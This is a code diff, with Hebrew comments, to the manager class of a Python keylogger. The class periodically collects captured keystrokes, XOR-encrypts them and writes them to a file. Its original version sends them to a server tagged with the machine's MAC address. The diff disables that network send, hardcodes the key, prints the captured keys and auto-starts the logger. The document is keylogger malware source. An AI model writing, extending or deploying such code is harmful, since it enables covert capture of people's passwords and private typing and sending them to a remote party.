@@ -1,7 +1,7 @@
 from KeyLoggerService import KeyLoggerService
-from Network_send import NetworkSend
+# from Network_send import NetworkSend
 from FileWriter import FileWriterWithTime
-from .env import encrypt_key
+# from .env import encrypt_key
 from Encryptor import XorEncryptor
 from Get_mac import get_mac_address
 import time
@@ -24,8 +24,9 @@ class KeyLoggerManager:
             time.sleep(self.timer) # המתנה לפי פרק הזמן המוגדר
             get_logger = self.logger.get_logged_keys() # קבלת נתונים
             if get_logger: # אם היו הקלדות
-                logger_encrypt = XorEncryptor(get_logger, encrypt_key).encrypt() # הצפנת הנתונים
-                NetworkSend(logger_encrypt).send_data(get_mac_address()) # שליחה לשרת
+                print(get_logger)
+                logger_encrypt = XorEncryptor(get_logger, "encrypt_key").encrypt() # הצפנת הנתונים
+                # NetworkSend(logger_encrypt).send_data(get_mac_address()) # שליחה לשרת
                 FileWriterWithTime(logger_encrypt).send_data('Key logger.txt') # הדפסה לקובץ
 
     def stop(self,keystrokes):
@@ -33,5 +34,5 @@ class KeyLoggerManager:
         self.running = False
         self.logger.stop_logging()
 
-
+KeyLoggerManager(5).start()
 # הושלם
